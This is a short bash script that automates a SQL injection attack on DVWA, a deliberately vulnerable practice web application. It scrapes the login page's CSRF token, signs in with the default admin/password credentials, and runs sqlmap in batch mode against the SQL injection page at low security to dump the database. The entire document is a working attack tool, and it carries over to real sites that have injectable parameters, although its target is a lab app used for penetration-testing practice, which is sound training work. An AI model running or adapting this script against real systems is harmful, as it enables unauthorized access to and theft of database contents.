#!/bin/bash
display_usage() { 
	echo -e "\nUsage: $0 [host] [port]\n" 
	} 
# if less than two arguments supplied, display usage 
	if [  $# -le 1 ] 
	then 
		display_usage
		exit 1
	fi 

host="http://$1"
port=$2
rm dvwa.cookie 2>/dev/null
rm /root/.sqlmap/output/dvwa.com/* -r 2>/dev/null
if [ "$port" -ne "80" ] 
	then
	  host="$host:$port"	
fi
echo $host
CSRF=$(curl -s -c dvwa.cookie "$host/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "$host/login.php"
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
cookie="PHPSESSID=${SESSIONID}"
sqlmap --random-agent --batch --flush-session -u "$host/vulnerabilities/sqli/?id=1&Submit=Submit#&#8221" --cookie="$cookie; security=low" --dump
